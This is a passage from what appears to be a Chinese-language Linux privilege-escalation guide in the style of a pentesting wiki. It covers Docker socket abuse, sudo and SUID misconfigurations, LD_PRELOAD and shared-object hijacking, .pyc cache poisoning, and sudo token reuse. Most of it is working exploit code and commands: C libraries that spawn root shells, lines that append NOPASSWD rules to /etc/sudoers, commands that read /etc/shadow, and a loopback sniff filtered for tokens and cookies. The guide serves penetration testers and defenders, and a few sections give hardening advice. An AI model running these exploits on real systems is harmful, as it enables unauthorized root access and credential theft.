#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**利用示例：**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP 套接字

请注意，可能存在一些**监听 HTTP** 请求的**套接字**（_这里说的不是 .socket 文件，而是充当 Unix 套接字的文件_）。你可以使用以下命令检查：
```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```
如果该 socket **响应 HTTP** 请求，那么你就可以与其进行**通信**，并可能**利用某些漏洞**。

### 可写的 Docker Socket

Docker socket 通常位于 `/var/run/docker.sock`，是一个必须受到保护的关键文件。默认情况下，只有 `root` 用户和 `docker` 组成员拥有写权限。拥有该 socket 的写访问权限可能导致权限提升。下面将介绍实现此目的的方法，以及在 Docker CLI 不可用时的替代方法。

#### **使用 Docker CLI 进行权限提升**

如果你拥有 Docker socket 的写访问权限，可以使用以下命令提升权限：
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
这些命令允许你运行一个对主机文件系统具有 root 级别访问权限的容器。

#### **直接使用 Docker API**

在 Docker CLI 不可用的情况下，仍然可以使用 Docker API 和 `curl` 命令操作 Docker socket。

1.  **列出 Docker 镜像：**获取可用镜像列表。

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **创建容器：**发送请求以创建一个挂载主机系统根目录的容器。

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

启动新创建的容器：

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **连接到容器：**使用 `socat` 建立与容器的连接，从而能够在其中执行命令。

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

建立 `socat` 连接后，你可以直接在容器中执行命令，并以 root 级别访问主机的文件系统。

### 其他方法

请注意，如果你因为**属于 `docker` 组**而拥有对 Docker socket 的写权限，那么你还有[**更多提权方法**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)。如果[**Docker API 正在某个端口上监听**，你也可能能够攻陷它](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

在以下页面中查看**更多逃逸容器或滥用容器运行时来提权的方法**：


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privilege escalation

如果你发现可以使用 **`ctr`** 命令，请阅读以下页面，因为你**可能能够滥用它来提权**：


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

如果你发现可以使用 **`runc`** 命令，请阅读以下页面，因为你**可能能够滥用它来提权**：


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus 是一种先进的**进程间通信（IPC）系统**，能够让应用程序高效地交互和共享数据。它针对现代 Linux 系统设计，为不同形式的应用程序通信提供了可靠的框架。

该系统功能多样，支持基础 IPC，可增强进程之间的数据交换，类似于**增强型 UNIX domain sockets**。此外，它还支持广播事件或信号，促进系统组件之间的无缝集成。例如，Bluetooth daemon 发出有来电的信号后，可以促使 music player 静音，从而改善用户体验。此外，D-Bus 还支持远程对象系统，简化应用程序之间的服务请求和方法调用，使原本复杂的流程更加顺畅。

D-Bus 采用 **allow/deny model**，根据匹配策略规则的累积效果管理消息权限（方法调用、信号发送等）。这些策略规定了与总线的交互方式，攻击者可能通过利用这些权限实现提权。

`/etc/dbus-1/system.d/wpa_supplicant.conf` 中提供了此类策略的示例，其中详细说明了 root 用户拥有、发送消息到以及接收来自 `fi.w1.wpa_supplicant1` 的消息的权限。

未指定用户或组的策略适用于所有用户和组，而 `"default"` 上下文策略适用于未被其他特定策略覆盖的所有对象。
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**了解如何枚举和利用 D-Bus 通信：**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **网络**

枚举网络并确定计算机所处的位置始终很有意义。

### 通用枚举
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```
### 出站过滤快速分诊

如果主机可以运行命令，但回连失败，请快速区分 DNS、传输、代理和路由过滤：
```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```
### 开放端口

在访问机器之前，始终检查机器上运行的、此前无法与之交互的网络服务：
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```
按绑定目标对监听器进行分类：

- `0.0.0.0` / `[::]`：暴露在所有本地接口上。
- `127.0.0.1` / `::1`：仅本地可访问（适合作为 tunnel/forward 候选）。
- 特定内部 IP（例如 `10.x`、`172.16/12`、`192.168.x`、`fe80::`）：通常只能从内部网段访问。

### 仅本地服务分诊工作流

当你 compromise 一台主机后，绑定到 `127.0.0.1` 的服务通常会首次从你的 shell 变得可访问。一个快速的本地工作流是：
```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```
### LinPEAS 作为网络扫描器（仅网络模式）

除了本地 PE 检查外，linPEAS 还可以作为专用的网络扫描器运行。它使用 `$PATH` 中可用的二进制文件（通常为 `fping`、`ping`、`nc`、`ncat`），不会安装任何工具。
```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```
如果在没有 `-t` 的情况下传入 `-d`、`-p` 或 `-i`，linPEAS 会作为纯 network scanner 运行（跳过其余 privilege-escalation 检查）。

### Sniffing

检查是否可以嗅探流量。如果可以，你可能能够获取某些凭据。
```
timeout 1 tcpdump
```
快速实用检查：
```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```
Loopback (`lo`) 在 post-exploitation 阶段尤其有价值，因为许多仅限内部访问的服务会在那里暴露 tokens/cookies/credentials：
```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
| egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```
现在捕获，稍后解析：
```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
-T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```
## 用户

### 通用枚举

检查你是**谁**、拥有哪些**权限**、系统中有哪些**用户**、哪些用户可以**登录**，以及哪些用户拥有 **root 权限**：
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

某些 Linux 版本受到一个漏洞影响，该漏洞允许 **UID > INT_MAX** 的用户提升权限。更多信息：[here](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) 和 [here](https://twitter.com/paragonsec/status/1071152249529884674)。\
使用以下命令**利用该漏洞**：**`systemd-run -t /bin/bash`**

### Groups

检查你是否是某个**组的成员**，该组可能授予你 root 权限：


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### Clipboard

检查剪贴板中是否包含任何有用的信息（如果可能）。
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### 密码策略
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### 已知密码

如果你**知道环境中的任何密码**，请尝试使用该密码以每个用户的身份进行登录。

### Su Brute

如果你不介意制造大量噪声，并且计算机上存在 `su` 和 `timeout` binaries，可以尝试使用 [su-bruteforce](https://github.com/carlospolop/su-bruteforce) 对用户进行 brute-force。\
带有 `-a` parameter 的 [**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 也会尝试对用户进行 brute-force。

## 可写 PATH 滥用

### $PATH

如果你发现可以**写入 $PATH 中的某个文件夹**，那么你可能可以通过在该可写文件夹中**创建 backdoor** 来提升 privileges。backdoor 的名称应为某个将由其他用户（最好是 root）执行的 command，并且该 command **不是从 $PATH 中位于你的可写文件夹之前的文件夹加载的**。

### SUDO 和 SUID

你可能被允许使用 sudo 执行某些 command，或者这些 command 可能具有 suid bit。使用以下命令检查：
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
某些**意外的命令允许你读取和/或写入文件，甚至执行命令。**例如：
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo 配置可能允许用户在不知道密码的情况下，以其他用户的权限执行某些命令。
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
在此示例中，用户 `demo` 可以以 `root` 身份运行 `vim`，现在只需将一个 ssh 密钥添加到 root 目录，或调用 `sh`，即可轻松获得 shell。
```
sudo vim -c '!sh'
```
### SETENV

此指令允许用户在执行某项操作时**设置环境变量**：
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
此示例**基于 HTB 主机 Admirer**，存在通过 **PYTHONPATH hijacking** 加载任意 python library 的**漏洞**，同时以 root 身份执行 script：
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### sudo-allowed Python imports 中可写的 `__pycache__` / `.pyc` poisoning

如果某个 **sudo-allowed Python script** imports 一个模块，而该模块的 package directory 包含一个**可写的 `__pycache__`**，你可能可以替换缓存的 `.pyc`，并在下次 import 时以 privileged user 身份实现 code execution。

- 工作原理：
- CPython 将 bytecode cache 存储在 `__pycache__/module.cpython-<ver>.pyc` 中。
- interpreter 会验证 **header**（magic + 与 source 绑定的 timestamp/hash metadata），然后执行该 header 后存储的 marshaled code object。
- 如果你可以**删除并重新创建**缓存文件（因为该 directory 可写），即使 `.pyc` 由 root 拥有且不可写，也仍然可以将其替换。
- 典型路径：
- `sudo -l` 显示一个可以以 root 身份运行的 Python script 或 wrapper。
- 该 script 从 `/opt/app/`、`/usr/local/lib/...` 等位置 import 一个 local module。
- 被 import 的 module 的 `__pycache__` directory 对你的 user 或所有人可写。

快速枚举：
```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```
如果你可以检查特权脚本，请识别其导入的模块及其缓存路径：
```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```
滥用流程：

1. 运行一次允许通过 `sudo` 执行的脚本，以便 Python 在合法的缓存文件不存在时创建该文件。
2. 从合法的 `.pyc` 中读取前 16 个字节，并在被投毒的文件中复用这些字节。
3. 编译 payload code object，对其执行 `marshal.dumps(...)`，删除原始缓存文件，然后使用原始 header 加上恶意 bytecode 重新创建该文件。
4. 再次运行允许通过 `sudo` 执行的脚本，使 import 以 root 身份执行你的 payload。

重要说明：

- 复用原始 header 是关键，因为 Python 会根据源文件检查缓存元数据，而不会检查 bytecode 主体是否确实与源文件匹配。
- 当源文件归 root 所有且不可写，但其所在的 `__pycache__` 目录可写时，这种方法尤其有用。
- 如果特权进程使用 `PYTHONDONTWRITEBYTECODE=1`、从权限安全的位置进行 import，或移除 import 路径中所有目录的写入权限，攻击将失败。

最小概念验证结构：
```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
src = pathlib.Path(d) / "x.py"
src.write_text(payload)
code = compile(src.read_text(), str(src), "exec")
pyc.unlink()
pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```
加固：

- 确保特权 Python import path 中没有任何目录可被低权限用户写入，包括 `__pycache__`。
- 对于特权运行，考虑设置 `PYTHONDONTWRITEBYTECODE=1`，并定期检查是否存在异常可写的 `__pycache__` 目录。
- 对待可写的本地 Python modules 和可写的 cache 目录，应采用与对待由 root 执行的可写 shell scripts 或 shared libraries 相同的方式。

### 通过 sudo env_keep 保留 BASH_ENV → root shell

如果 sudoers 保留了 `BASH_ENV`（例如 `Defaults env_keep+="ENV BASH_ENV"`），则可以利用 Bash 的非交互式启动行为，在调用允许的 command 时以 root 身份运行任意代码。

- 原理：对于非交互式 shell，Bash 会解析 `$BASH_ENV` 并在运行目标 script 前 source 该文件。许多 sudo 规则允许运行某个 script 或 shell wrapper。如果 `BASH_ENV` 被 sudo 保留，则你的文件会以 root 权限被 source。

- 要求：
- 一个可以运行的 sudo rule（任何会以非交互方式调用 `/bin/bash` 的目标，或任何 bash script）。
- `BASH_ENV` 存在于 `env_keep` 中（使用 `sudo -l` 检查）。

- PoC：
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- 加固：
- 从 `env_keep` 中移除 `BASH_ENV`（以及 `ENV`），优先使用 `env_reset`。
- 避免为 sudo 允许的命令使用 shell wrappers；使用最小化的 binaries。
- 当使用保留的环境变量时，考虑启用 sudo I/O logging 和 alerting。

### 通过 sudo 使用保留 HOME 的 Terraform（!env_reset）

如果 sudo 保持环境不变（`!env_reset`），同时允许执行 `terraform apply`，则 `$HOME` 会保留为调用用户的 HOME。Terraform 因此会以 root 身份加载 **$HOME/.terraformrc**，并遵循 `provider_installation.dev_overrides`。

- 将所需的 provider 指向一个可写目录，并放置一个以该 provider 命名的恶意 plugin（例如：`terraform-provider-examples`）：
```hcl
# ~/.terraformrc
provider_installation {
dev_overrides {
"previous.htb/terraform/examples" = "/dev/shm"
}
direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```
Terraform 将无法通过 Go plugin handshake，但会在终止前以 root 身份执行 payload，从而留下一个 SUID shell。

### TF_VAR 覆盖 + symlink validation bypass

Terraform variables 可以通过 `TF_VAR_<name>` environment variables 提供；当 sudo 保留 environment 时，这些 variables 仍会存在。诸如 `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` 之类的薄弱 validation 可以通过 symlink 绕过：
```bash
mkdir -p /dev/shm/root/examples
ln -s /root/root.txt /dev/shm/root/examples/flag
TF_VAR_source_path=/dev/shm/root/examples/flag sudo /usr/bin/terraform -chdir=/opt/examples apply
cat /home/$USER/docker/previous/public/examples/flag
```
Terraform 会解析符号链接，并将真实的 `/root/root.txt` 复制到攻击者可读取的目标位置。通过预先创建目标符号链接，也可以使用相同的方法**写入**特权路径（例如，将 provider 的目标路径指向 `/etc/cron.d/` 内部）。

### requiretty / !requiretty

在一些较旧的发行版中，可以通过 `requiretty` 配置 sudo，强制 sudo 只能从交互式 TTY 中运行。如果设置了 `!requiretty`（或未设置该选项），则可以从 reverse shells、cron jobs 或 scripts 等非交互式上下文中执行 sudo。
```bash
Defaults !requiretty
```
这本身不是一个直接的漏洞，但它扩大了无需完整 PTY 即可滥用 sudo 规则的情况。

### Sudo env_keep+=PATH / insecure secure_path → PATH hijack

如果 `sudo -l` 显示 `env_keep+=PATH`，或者 `secure_path` 包含攻击者可写入的条目（例如 `/home/<user>/bin`），则 sudo 允许执行的目标中使用的任何相对路径命令都可能被同名命令覆盖。

- 要求：存在一条 sudo 规则（通常为 `NOPASSWD`），用于运行调用未使用绝对路径的命令的脚本/二进制文件（`free`、`df`、`ps` 等），并且存在一个会被优先搜索的可写 PATH 条目。
```bash
cat > ~/bin/free <<'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x ~/bin/free
sudo /usr/local/bin/system_status.sh   # calls free → runs our trojan
bash -p                                # root shell via SUID bit
```
### Sudo 执行绕过路径
**跳转**以读取其他文件或使用**符号链接**。例如在 sudoers 文件中：_hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
如果使用了 **通配符**（\*），就更容易了：
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### 未指定命令路径的 Sudo command/SUID binary

如果将 **sudo permission** 授予单个命令但**未指定路径**：_hacker10 ALL= (root) less_，则可以通过更改 PATH 变量来利用它。
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
如果一个 **suid** binary **执行另一个命令时未指定其路径（始终使用** _**strings**_ **检查可疑 SUID binary 的内容）**，也可以使用此 technique。

[Payload examples to execute.](../../processes-crontab-systemd-dbus/payloads-to-execute.md)

### 带命令路径的 SUID binary

如果 **suid** binary **执行另一个命令时指定了路径**，那么你可以尝试 **export 一个以该命令命名的 function**，即 suid 文件所调用的命令。

例如，如果一个 suid binary 调用 _**/usr/sbin/service apache2 start**_，你需要尝试创建并 export 该 function：
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
然后，当你调用 SUID binary 时，该函数将被执行

### 由 SUID wrapper 执行的可写 script

一种常见的 custom-app 配置错误是：root-owned SUID binary wrapper 执行某个 script，而该 script 本身可被低权限用户写入。

典型模式：
```c
int main(void) {
system("/bin/bash /usr/local/bin/backup.sh");
}
```
如果 `/usr/local/bin/backup.sh` 可写，你可以追加 payload 命令，然后执行 SUID wrapper：
```bash
echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
快速检查：
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
如果你能够使用 `sudo` 执行命令，并且 `sudo -l` 的输出包含 **env_keep+=LD_PRELOAD**，则可能发生 Privilege escalation。该配置允许 **LD_PRELOAD** 环境变量持续存在，即使命令通过 `sudo` 运行时也能被识别，从而可能以 elevated privileges 执行 arbitrary code。
```
Defaults        env_keep += LD_PRELOAD
```
保存为 **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
然后使用以下命令对其进行**编译**：
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
最后，运行 **escalate privileges** 以提升权限
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> 如果攻击者控制 **LD_LIBRARY_PATH** 环境变量，也可以滥用类似的 privesc，因为他可以控制搜索库的路径。
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so 注入

当遇到一个具有 **SUID** 权限且看起来异常的 binary 时，最好确认它是否正确加载 **.so** 文件。可以运行以下命令进行检查：
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
例如，遇到类似 _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ 的错误，可能表明存在可利用的机会。

要利用这一点，可以创建一个 C 文件，例如 _"/path/to/.config/libcalc.c"_，其中包含以下代码：
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
此代码在编译并执行后，旨在通过操纵文件权限并执行具有提升权限的 shell 来提升权限。

使用以下命令将上述 C 文件编译为共享对象（.so）文件：
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
最后，运行受影响的 SUID binary 应触发 exploit，从而可能导致系统遭到 compromise。

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
现在我们已经找到一个从我们可写入的目录加载库的 SUID binary，让我们在该目录中使用所需名称创建该库：
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
如果遇到类似以下错误
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
这意味着你生成的 library 需要包含一个名为 `a_function_name` 的 function。

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) 是一个经过整理的 Unix binaries 列表，攻击者可以利用这些 binaries 绕过本地安全限制。[**GTFOArgs**](https://gtfoargs.github.io/) 与之相同，但适用于你**只能注入 arguments** 到 command 中的情况。

该项目收集了 Unix binaries 的合法功能，这些功能可以被滥用来跳出受限 shell、提升或维持 elevated privileges、传输 files、生成 bind 和 reverse shells，以及协助完成其他 post-exploitation tasks。

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

如果你可以访问 `sudo -l`，可以使用 [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) 检查它是否能找到利用某条 sudo rule 的方法。

### Reusing Sudo Tokens

在你拥有 **sudo access** 但没有 password 的情况下，可以通过**等待 sudo command 执行，然后劫持 session token** 来提升 privileges。

提升 privileges 的要求：

- 你已经拥有一个以 user "_sampleuser_" 身份运行的 shell
- "_sampleuser_" 在**最近 15 分钟内使用过 `sudo`** 执行某些操作（默认情况下，这就是允许我们使用 `sudo` 而无需再次输入 password 的 sudo token 有效时长）
- `cat /proc/sys/kernel/yama/ptrace_scope` 的值为 0
- `gdb` 可访问（你需要能够上传它）

（你可以使用 `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` 临时启用 `ptrace_scope`，或者永久修改 `/etc/sysctl.d/10-ptrace.conf`，并设置 `kernel.yama.ptrace_scope = 0`）

如果满足所有这些要求，**你可以使用以下方式提升 privileges：** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- 第一个 exploit（`exploit.sh`）会在 _/tmp_ 中创建 binary `activate_sudo_token`。你可以使用它**在当前 session 中激活 sudo token**（不会自动获得 root shell，请执行 `sudo su`）：
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **第二个 exploit**（`exploit_v2.sh`）将在 _/tmp_ 中创建一个**由 root 所有且具有 setuid 权限的** sh shell。
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **第三个 exploit**（`exploit_v3.sh`）将**创建一个 sudoers 文件**，使 **sudo tokens 永不过期，并允许所有用户使用 sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

如果你对该文件夹或文件夹内创建的任何文件具有**写权限**，则可以使用 binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) 为某个用户和 PID **创建 sudo token**。\
例如，如果你可以覆盖文件 _/var/run/sudo/ts/sampleuser_，并且拥有该用户的 shell，其 PID 为 1234，则无需知道密码即可通过以下操作**获得 sudo 权限**：
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers、/etc/sudoers.d

`/etc/sudoers` 文件以及 `/etc/sudoers.d` 中的文件用于配置哪些用户可以使用 `sudo` 以及使用方式。这些文件**默认只能由用户 root 和组 root 读取**。\
**如果**你可以**读取**此文件，就可能**获取一些有价值的信息**；如果你可以**写入**任何文件，就能够**提升权限**。
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
如果你具有写入权限，就可以滥用此权限
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
滥用这些权限的另一种方法：
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

有一些替代 `sudo` 的 binary，例如 OpenBSD 的 `doas`，记得检查其配置文件 `/etc/doas.conf`。
```bash
permit nopass demo as root cmd vim
permit nopass demo as root cmd python3
permit nopass keepenv demo as root cmd /opt/backup.sh
```
如果 `doas` 允许使用编辑器或解释器，请检查 GTFOBins 风格的逃逸方法：
```bash
doas vim
:!/bin/sh
```
### Sudo Hijacking

